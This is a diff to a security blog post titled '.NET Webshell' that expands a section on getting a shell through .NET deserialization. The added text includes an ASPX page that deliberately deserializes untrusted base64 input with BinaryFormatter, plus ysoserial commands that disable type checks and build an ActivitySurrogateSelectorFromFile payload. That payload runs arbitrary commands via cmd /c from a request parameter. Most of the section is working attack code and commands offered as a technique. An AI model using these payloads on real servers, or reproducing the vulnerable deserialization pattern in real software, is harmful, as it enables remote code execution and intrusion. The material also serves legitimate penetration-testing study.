@@ -1,4 +1,4 @@
----
+![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/43e8f6cc-9882-49f5-b58b-73faa89827ad)---
 title: .NET Webshell
 date: 2023-12-26 08:51:00 +0700
 categories: [Others]
@@ -60,7 +60,40 @@ To sum up, you have to has to combine path traversal with arbitrary file upload,
 ## Deserialize
 In case of deserialize, each time we want to execute different command, we have to re-generate payload using ysoserial, then url encode, send request, etc, ... For better use, sometimes people manipulate deserialization to create web shell, but it leads to problem I already said in the overview above. But we really can get shell without creating files on the server with gadget ActivitySurrogateSelectorFromFile already included in ysoserial. This gadget will create an assembly with our custom C# code, then when deserialize, make the server load that assembly.
 
-First create ExploitClass.cs
+First create deserialize.aspx for demonstration, this basically base64-decodes [string] parameter and deserialize the result.
+
+```csharp
+<%@ Page Language="C#" Debug="true" Trace="false" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Runtime.Serialization.Formatters.Binary" %>
+
+<script Language="c#" runat="server">
+void Page_Load(object sender, EventArgs e)
+{
+    BinaryFormatter binaryFormatter = new BinaryFormatter();
+    string base64 = Request["string"];
+       if (base64 != null)
+            {
+                byte[] vs = Convert.FromBase64String(base64);
+                MemoryStream stream = new MemoryStream(vs);
+                stream.Position = 0;
+                binaryFormatter.Deserialize(stream);
+            }
+}
+
+</script>
+```
+
+.NET framework version 4.8+ implements type protections for ActivitySurrogateSelector, so we have to disable it first, send payload generated from the following command via [string] parameter
+
+```bash
+ysoserial.exe -f binaryformatter -g ActivitySurrogateDisableTypeCheck -c 123
+```
+
+![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/fad66618-b37e-48d0-87c4-08227c9b045c)
+
+Create ExploitClass.cs, this class has constructor that get command from [c] parameter then execute it with `cmd /c `
 
 ```csharp
 // ExploitClass.cs
@@ -91,12 +124,13 @@ class E{
     }}
 ```
 
-Then using generate payload with ysoserial
+Then generate payload with ysoserial, it would create assembly for above class, with dependencies on the rest of [-c] option
 
 ```bash
-ysoserial.exe -g ActivitySurrogateSelectorFromFile -f BinaryFormatter -c "ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll" --outputpath payload.txt
+ysoserial.exe -g ActivitySurrogateSelectorFromFile -f BinaryFormatter -c "ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll"
 ```
 
-Then now we can execute any command via [c] parameter
+Put payload to [string] param. Now we can execute any command via [c] parameter
 
+![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/60534912-dba6-4580-8aab-cc128df49ad7)
 
